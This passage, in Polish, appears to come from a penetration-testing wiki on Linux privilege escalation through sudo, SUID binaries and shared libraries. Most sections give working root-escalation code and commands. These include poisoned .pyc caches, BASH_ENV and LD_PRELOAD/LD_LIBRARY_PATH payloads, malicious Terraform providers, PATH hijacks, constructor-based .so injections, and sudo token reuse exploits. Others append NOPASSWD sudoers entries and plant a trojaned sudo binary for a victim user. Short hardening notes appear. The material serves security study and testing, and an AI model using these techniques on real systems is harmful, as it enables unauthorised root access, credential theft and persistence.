### Zatruwanie zapisywalnego `__pycache__` / `.pyc` przy importach Pythona dozwolonych przez sudo

Jeśli **skrypt Pythona dozwolony przez sudo** importuje moduł, którego katalog pakietu zawiera **zapisywalny `__pycache__`**, możesz być w stanie podmienić buforowany plik `.pyc` i uzyskać wykonanie kodu jako uprzywilejowany użytkownik przy następnym imporcie.<sup>[[30]](#references)</sup>

- Dlaczego to działa:
  - CPython przechowuje bufory kodu bajtowego w `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Interpreter weryfikuje **nagłówek** (sygnaturę magiczną + metadane znacznika czasu/hasza powiązane ze źródłem), a następnie wykonuje obiekt kodu zapisany w formacie marshal za tym nagłówkiem.
  - Jeśli możesz **usunąć i odtworzyć** buforowany plik, ponieważ katalog jest zapisywalny, nadal możesz zastąpić plik `.pyc`, którego właścicielem jest root i który nie jest zapisywalny.
- Typowa ścieżka:
  - `sudo -l` pokazuje skrypt lub wrapper Pythona, który możesz uruchomić jako root.
  - Ten skrypt importuje lokalny moduł z `/opt/app/`, `/usr/local/lib/...` itd.
  - Katalog `__pycache__` importowanego modułu jest zapisywalny przez Twojego użytkownika lub przez wszystkich.

Szybkie rozpoznanie:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Jeśli możesz sprawdzić skrypt uruchamiany z uprawnieniami, ustal, jakie moduły importuje i gdzie znajduje się ich pamięć podręczna:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Schemat wykorzystania:

1. Uruchom raz skrypt dozwolony przez sudo, aby Python utworzył prawidłowy plik cache, jeśli jeszcze nie istnieje.
2. Odczytaj pierwsze 16 bajtów z prawidłowego pliku `.pyc` i użyj ich w zatrutym pliku.
3. Skompiluj obiekt kodu z payloadem, użyj `marshal.dumps(...)`, usuń oryginalny plik cache i utwórz go ponownie, łącząc oryginalny nagłówek ze złośliwym bytecode.
4. Ponownie uruchom skrypt dozwolony przez sudo, aby import wykonał payload z uprawnieniami roota.

Ważne uwagi:

- Ponowne użycie oryginalnego nagłówka jest kluczowe, ponieważ Python sprawdza metadane cache względem pliku źródłowego, a nie to, czy treść bytecode faktycznie odpowiada źródłu.
- Jest to szczególnie przydatne, gdy plik źródłowy należy do roota i nie można go zapisywać, ale można zapisywać w zawierającym go katalogu `__pycache__`.
- `PYTHONDONTWRITEBYTECODE=1` i `python -B` uniemożliwiają Pythonowi zapisywanie nowych plików `.pyc`; **nie** uniemożliwiają mu wczytania już istniejącego, prawidłowego cache, który został podmieniony przez atakującego. Kluczowe jest to, czy użytkownik z niższymi uprawnieniami może podmienić cache, który zaakceptuje uprzywilejowany import. Przed wczytaniem zcache’owanego bytecode Python sprawdza metadane znacznika czasu/rozmiaru lub sumy skrótu. Zobacz [dokumentację referencyjną importu w Pythonie](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) i [dokumentację wiersza poleceń](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Minimalny kształt proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Utwardzanie:

- Upewnij się, że żaden katalog na uprzywilejowanej ścieżce importu Pythona nie jest zapisywalny przez użytkowników o niskich uprawnieniach — dotyczy to również `__pycache__`.
- Sprawdź właścicieli i uprawnienia katalogów cache, w tym istniejących plików `.pyc`. Wyłączenie zapisu bytecode może ograniczyć tworzenie nowych plików cache, ale nie zabezpiecza przed podmianą istniejącego pliku cache.
- Traktuj zapisywalne lokalne moduły Pythona i zapisywalne katalogi cache tak samo jak zapisywalne skrypty powłoki lub biblioteki współdzielone uruchamiane przez root.

### BASH_ENV zachowany przez sudo env_keep → powłoka root

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać zachowanie startowe Bash dla powłok nieinteraktywnych, aby uruchomić dowolny kod jako root podczas wywoływania dozwolonego polecenia.<sup>[[24]](#references)</sup>

- Dlaczego to działa: w przypadku powłok nieinteraktywnych Bash oblicza wartość `$BASH_ENV` i wykonuje wskazany plik przed uruchomieniem skryptu docelowego. Wiele reguł sudo pozwala uruchamiać skrypt lub wrapper powłoki. Jeśli sudo zachowuje `BASH_ENV`, wskazany przez ciebie plik zostanie wykonany z uprawnieniami root.<sup>[[23]](#references)</sup>

- Wymagania:
  - Reguła sudo, którą możesz uruchomić (dowolny cel wywołujący `/bin/bash` w trybie nieinteraktywnym lub dowolny skrypt Bash).
  - `BASH_ENV` obecny w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Utwardzanie:
  - Usuń `BASH_ENV` (i `ENV`) z `env_keep`, preferuj `env_reset`.
  - Unikaj wrapperów powłoki dla poleceń dozwolonych przez sudo; używaj minimalnych plików binarnych.
  - Rozważ logowanie I/O sudo i alerty, gdy używane są zachowane zmienne środowiskowe.

### Terraform przez sudo z zachowanym HOME (!env_reset)

Gdy sudo pozwala uruchomić Terraform jako użytkownik z wyższymi uprawnieniami, `!env_reset` to wskazówka, by sprawdzić, które zmienne środowiskowe faktycznie zachowuje ta konkretna reguła. Zanim uznasz plik `.terraformrc` lub `terraform.rc`, do którego wywołujący ma prawo zapisu, za aktywną konfigurację CLI, potwierdź efektywną wartość `HOME` lub `TF_CLI_CONFIG_FILE`. Wpis `provider_installation.dev_overrides` ma znaczenie tylko wtedy, gdy ustalone polecenie Terraform ładuje danego providera, a wywołujący może umieścić jego plik wykonywalny w wybranym katalogu.<sup>[[25]](#references)</sup>

- Wskaż wymagany provider na katalog z prawem zapisu i umieść tam złośliwy plugin nazwany tak jak provider (np. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform nie przejdzie uzgadniania pluginu Go, ale przed awarią uruchomi payload jako root, pozostawiając po sobie powłokę SUID.

### Nadpisywanie TF_VAR + obejście walidacji dowiązań symbolicznych

Zmienne Terraform można przekazywać za pomocą zmiennych środowiskowych `TF_VAR_<name>`, jeśli dana reguła sudo zachowuje ich wartości. Odczyt źródła przez dowiązanie symboliczne wymaga również providera, który podąża za dowiązaniem i kopiuje chroniony wynik do miejsca docelowego, które może odczytać użytkownik wywołujący. Zapis do miejsca docelowego będącego dowiązaniem symboliczny wymaga osobno wpisu miejsca docelowego kontrolowanego przez użytkownika wywołującego oraz uprzywilejowanego providera, który podąża za nim podczas zapisu; późniejsze zadanie zaplanowane to tylko jedna z możliwych konsekwencji. Przed testowaniem którejkolwiek z tych ścieżek sprawdź dokładny zakres uprawnień sudo, odpowiednie pliki `.tf`, wybraną konfigurację CLI i właścicieli ścieżek za pomocą poleceń tylko do odczytu, takich jak `sudo -l`, `stat` i `readlink`. Słabe walidacje leksykalne, takie jak `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, nie rozwiązują dowiązań symbolicznych:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform rozwiązuje symlink i kopiuje rzeczywisty plik `/root/root.txt` do lokalizacji dostępnej dla atakującego. Tego samego podejścia można użyć do **zapisu** w uprzywilejowanych ścieżkach, tworząc wcześniej symlinki w lokalizacji docelowej (np. wskazujące ścieżkę docelową providera wewnątrz `/etc/cron.d/`).

### requiretty / !requiretty

W niektórych starszych dystrybucjach sudo można skonfigurować z opcją `requiretty`, która wymusza uruchamianie sudo wyłącznie z interaktywnego TTY. Jeśli ustawiono `!requiretty` (lub opcja ta jest nieobecna), sudo można uruchamiać z kontekstów nieinteraktywnych, takich jak reverse shells, zadania cron lub skrypty.

```bash
Defaults !requiretty
```

Nie jest to bezpośrednia podatność sama w sobie, ale zwiększa zakres sytuacji, w których można nadużyć reguł sudo bez potrzeby uzyskania pełnego PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Jeśli `sudo -l` pokazuje `env_keep+=PATH` lub `secure_path` zawierający wpisy zapisywalne przez atakującego (np. `/home/<user>/bin`), niekwalifikowane polecenie zewnętrzne wywoływane przez cel dozwolony w sudo może zostać przesłonięte.<sup>[[3]](#references)</sup> Brak efektywnego `secure_path` również warto sprawdzić, **jeśli** środowisko sudo polecenia zachowuje kontrolowaną przez wywołującego wartość `PATH`; sam brak nie dowodzi, że tak jest. Przeczytaj dozwolony skrypt bez jego uruchamiania, a następnie zweryfikuj dokładną regułę RunAs i argumentów, efektywną ścieżkę wyszukiwania poleceń oraz wcześniejszy w kolejności katalog zapisywalny i dostępny do przeszukiwania, zawierający nazwę polecenia. Uwierzytelnianie, `NOEXEC`, wbudowane polecenia powłoki i bezwzględne ścieżki do poleceń mogą zmienić wynik.

- Wymagania: reguła sudo (często `NOPASSWD`) uruchamiająca skrypt/binary, który wywołuje polecenia bez bezwzględnych ścieżek (`free`, `df`, `ps` itp.), oraz zapisywalny wpis `PATH`, który jest przeszukiwany jako pierwszy.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Obchodzenie ścieżek podczas wykonywania przez Sudo
**Przejdź**, aby odczytać inne pliki lub użyć **symlinks**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Jeśli użyto **wildcard** (\*), jest to jeszcze łatwiejsze:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Polecenie Sudo / plik binarny SUID bez ścieżki do polecenia

Jeśli **uprawnienie sudo** jest przyznane do pojedynczego polecenia **bez podania ścieżki**: _hacker10 ALL= (root) less_, możesz je wykorzystać, zmieniając zmienną PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Tej techniki można również użyć, jeśli binarny plik **suid** **wykonuje inne polecenie bez podania do niego ścieżki (zawsze sprawdzaj zawartość podejrzanego pliku SUID za pomocą** _**strings**_**)**.

[Przykłady payloadów do wykonania.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binarny plik SUID ze ścieżką do polecenia

Jeśli binarny plik **suid** **wykonuje inne polecenie, podając do niego ścieżkę**, możesz spróbować **wyeksportować funkcję** o nazwie takiej jak polecenie wywoływane przez plik SUID.

Na przykład jeśli binarny plik SUID wywołuje _**/usr/sbin/service apache2 start**_, spróbuj utworzyć i wyeksportować funkcję:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Następnie, gdy wywołasz binarny plik SUID, ta funkcja zostanie wykonana

### Niestandardowe wrappery SUID do kopiowania

Narzędzie SUID należące do użytkownika root, które przyjmuje ścieżki źródłową i docelową, może przekraczać dwie różne granice zaufania. Jeśli buduje polecenie powłoki z któregokolwiek argumentu (na przykład przekazuje skonstruowane polecenie `cp` do `system()`), metaznaki powłoki mogą uruchomić inne polecenie z jego efektywnymi uprawnieniami. Nawet jeśli wywołuje `cp` bezpiecznie, bez użycia powłoki, nieograniczona ścieżka docelowa może umożliwić dowolny zapis z podwyższonymi uprawnieniami do plików takich jak `/etc/passwd`. Sprawdź obsługę argumentów przez wrapper, zachowanie efektywnego UID, ograniczenia dotyczące ścieżki docelowej oraz to, czy kopiowany plik zachowuje treść kontrolowaną przez użytkownika; ogólny błąd `cp` ani sam bit SUID nie stanowią dowodu na żadną z tych możliwości. Przed ręcznym testowaniem pasywnie zinwentaryzuj plik binarny i jego uprawnienia.

### Zapisywalny skrypt uruchamiany przez wrapper SUID

Częstą błędną konfiguracją w niestandardowych aplikacjach jest należący do użytkownika root wrapper będący plikiem binarnym SUID, który uruchamia skrypt, podczas gdy sam skrypt jest zapisywalny przez użytkowników o niskich uprawnieniach.

Typowy wzorzec:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Jeśli plik `/usr/local/bin/backup.sh` można modyfikować, możesz dopisać polecenia payloadu, a następnie uruchomić wrapper SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Szybkie kontrole:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Ta ścieżka ataku jest szczególnie powszechna w wrapperach „maintenance”/„backup” dostarczanych w `/usr/local/bin`.

### LD_PRELOAD i **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do wskazania jednej lub kilku bibliotek współdzielonych (plików .so), które loader ma załadować przed wszystkimi pozostałymi, w tym standardową biblioteką C (`libc.so`). Ten proces nazywa się preloadingiem biblioteki.

Aby jednak utrzymać bezpieczeństwo systemu i zapobiec nadużywaniu tej funkcji, szczególnie w przypadku plików wykonywalnych **suid/sgid**, system wymusza określone warunki:

- Loader ignoruje **LD_PRELOAD** w przypadku plików wykonywalnych, dla których rzeczywisty identyfikator użytkownika (_ruid_) nie jest zgodny z efektywnym identyfikatorem użytkownika (_euid_).
- W przypadku plików wykonywalnych z suid/sgid preloadowane są tylko biblioteki ze standardowych ścieżek, które również mają suid/sgid.

Do eskalacji uprawnień może dojść, jeśli możesz wykonywać polecenia za pomocą `sudo`, a wynik `sudo -l` zawiera wpis **env_keep+=LD_PRELOAD**. Ta konfiguracja pozwala zachować zmienną środowiskową **LD_PRELOAD** i uwzględniać ją także podczas uruchamiania poleceń przez `sudo`, co może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Zapisz jako **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Następnie **skompiluj go** za pomocą:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Na koniec **eskaluj uprawnienia**, uruchamiając

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Podobny privesc można wykorzystać, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

W przypadku napotkania pliku binarnego z uprawnieniami **SUID**, który wydaje się nietypowy, dobrą praktyką jest sprawdzenie, czy poprawnie ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Na przykład napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ wskazuje na potencjalną możliwość wykorzystania luki.

Aby to wykorzystać, należy utworzyć plik C, na przykład _"/path/to/.config/libcalc.c"_, zawierający następujący kod:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Ten kod, po skompilowaniu i uruchomieniu, ma na celu podniesienie uprawnień poprzez manipulowanie uprawnieniami plików i uruchomienie powłoki z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do obiektu współdzielonego (.so) za pomocą:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Na koniec uruchomienie podatnego pliku binarnego SUID powinno wywołać exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Teraz, gdy znaleźliśmy plik binarny SUID ładujący bibliotekę z folderu, do którego możemy zapisywać, utwórzmy w tym folderze bibliotekę o wymaganej nazwie:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Jeśli pojawi się błąd taki jak

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

to oznacza, że wygenerowana biblioteka musi zawierać funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to wyselekcjonowana lista plików binarnych systemu Unix, które atakujący może wykorzystać do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) to podobna lista, ale dotyczy przypadków, w których możesz **wstrzykiwać wyłącznie argumenty** do polecenia.

Projekt gromadzi legalne funkcje plików binarnych systemu Unix, które można wykorzystać do ucieczki z ograniczonych powłok, eskalacji lub utrzymania podwyższonych uprawnień, przesyłania plików, uruchamiania powłok bind i reverse oraz wykonywania innych zadań post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli masz dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy potrafi ono znaleźć sposób na wykorzystanie którejś z reguł sudo.

### Ponowne używanie tokenów sudo

Jeśli masz **dostęp do sudo**, ale nie znasz hasła, możesz eskalować uprawnienia, **czekając na wykonanie polecenia sudo, a następnie przejmując token sesji**.<sup>[[18]](#references)</sup>

Wymagania do eskalacji uprawnień:

- Masz już powłokę użytkownika "_sampleuser_"
- Użytkownik "_sampleuser_" **użył `sudo`** do wykonania czegoś w ciągu **ostatnich 15 minut** (domyślnie tyle czasu ważny jest token sudo, który pozwala używać `sudo` bez podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` zwraca 0
- `gdb` jest dostępne (możesz je przesłać)

(Możesz tymczasowo włączyć `ptrace_scope`, wykonując `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`, albo włączyć je na stałe, modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia za pomocą:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Pierwszy exploit** (`exploit.sh`) utworzy plik binarny `activate_sudo_token` w _/tmp_. Możesz go użyć, aby **aktywować token sudo w swojej sesji** (nie otrzymasz automatycznie powłoki roota — wykonaj `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Drugi exploit** (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_, **należącą do roota i z ustawionym setuid**.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Trzeci exploit** (`exploit_v3.sh`) **utworzy plik sudoers**, który sprawi, że **tokeny sudo będą wieczne i wszyscy użytkownicy będą mogli korzystać z sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia do zapisu** w folderze lub w którymkolwiek z utworzonych w nim plików, możesz użyć pliku binarnego [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), aby **utworzyć token sudo dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz powłokę jako ten użytkownik z PID 1234, możesz **uzyskać uprawnienia sudo** bez znajomości hasła, wykonując:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki w katalogu `/etc/sudoers.d` określają, kto może używać `sudo` i w jaki sposób. **Domyślnie pliki te mogą być odczytywane wyłącznie przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz **uzyskać interesujące informacje**, a jeśli możesz **zapisywać** w dowolnym pliku, będziesz w stanie **eskalować uprawnienia**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Jeśli masz uprawnienia do zapisu, możesz je nadużyć.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Inny sposób nadużycia tych uprawnień:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Istnieją alternatywy dla pliku binarnego `sudo`, takie jak `doas` w OpenBSD. Pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Jeśli `doas` zezwala na użycie edytora lub interpretera, sprawdź techniki ucieczki w stylu GTFOBins:

```bash
doas vim
:!/bin/sh
```

Reguła `doas` z uprawnieniami roota dla oryginalnego `dstat` opartego na Pythonie również uzasadnia sprawdzenie ścieżek wtyczek. Jego [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) i [kod źródłowy](https://github.com/dstat-real/dstat/blob/master/dstat) wymieniają `/usr/share/dstat/` i `/usr/local/share/dstat/` jako lokalizacje wtyczek `dstat_*.py`. Jeśli bieżący użytkownik może zapisywać w lokalizacji używanej przez zainstalowaną kompilację i przeszukiwać ją, wybrana wtyczka może zostać uruchomiona z tożsamością RunAs określoną przez `doas`. Sprawdź efektywną regułę, sposób wyszukiwania wtyczek w tej kompilacji, uprawnienia lub listy ACL katalogu i katalogów nadrzędnych oraz to, czy wywołujący może wybrać wtyczkę; sama reguła `dstat` lub katalog z prawem zapisu to tylko wskazówka. Inne implementacje `dstat` mogą korzystać z odmiennych systemów wtyczek. Sprawdzaj metadane pasywnie, nie ładując wtyczki.

### Sudo Hijacking

Jeśli wiesz, że **użytkownik zwykle łączy się z maszyną i używa `sudo`** do eskalacji uprawnień, a Ty uzyskałeś shell w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny `sudo`**, który uruchomi Twój kod jako root, a następnie polecenie użytkownika. Potem **zmodyfikuj `$PATH`** w kontekście użytkownika (na przykład dodając nową ścieżkę w `.bash_profile`), aby po uruchomieniu `sudo` przez użytkownika wykonany został Twój plik `sudo`.

Pamiętaj, że jeśli użytkownik korzysta z innego shell (nie z basha), musisz zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Inny przykład znajdziesz w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Można też uruchomić coś w rodzaju:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje **skąd pochodzą wczytywane pliki konfiguracyjne**. Zazwyczaj zawiera on następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że zostaną odczytane pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf`. Te pliki konfiguracyjne **wskazują inne foldery**, w których będą **wyszukiwane** **biblioteki**. Na przykład zawartość pliku `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **Oznacza to, że system będzie wyszukiwał biblioteki w folderze `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** w którejkolwiek ze wskazanych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnym pliku w `/etc/ld.so.conf.d/` lub dowolnym folderze wskazanym w pliku konfiguracyjnym z `/etc/ld.so.conf.d/*.conf`, może być w stanie eskalować uprawnienia.\
Zobacz, **jak wykorzystać tę błędną konfigurację** na stronie:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Po skopiowaniu biblioteki do `/var/tmp/flag15/` program użyje jej z tej lokalizacji, zgodnie z wartością zmiennej `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities zapewniają **procesowi podzbiór dostępnych uprawnień roota**. W praktyce dzielą **uprawnienia roota na mniejsze, odrębne jednostki**. Każdą z tych jednostek można następnie niezależnie przydzielać procesom. Dzięki temu pełny zestaw uprawnień zostaje ograniczony, co zmniejsza ryzyko wykorzystania luk.\
Przeczytaj poniższą stronę, aby **dowiedzieć się więcej o capabilities i sposobach ich nadużywania**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Uprawnienia katalogu

W katalogu **bit „execute”** oznacza, że dany użytkownik może użyć polecenia „**cd**”, aby przejść do katalogu.\
Bit **„read”** oznacza, że użytkownik może wyświetlać **pliki**, a bit **„write”** oznacza, że może usuwać i tworzyć nowe **pliki**.

## ACL

Access Control Lists (ACL) stanowią dodatkową warstwę uprawnień uznaniowych, która może **nadpisywać tradycyjne uprawnienia ugo/rwx**. Uprawnienia te zapewniają większą kontrolę nad dostępem do plików i katalogów, umożliwiając przyznawanie lub odmawianie praw określonym użytkownikom, którzy nie są ich właścicielami ani członkami grupy. Taki poziom **szczegółowości pozwala precyzyjniej zarządzać dostępem**. Więcej informacji można znaleźć [**tutaj**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Przyznaj** użytkownikowi „kali” uprawnienia do odczytu i zapisu pliku:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Wyszukaj** pliki z określonymi ACL-ami w systemie:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

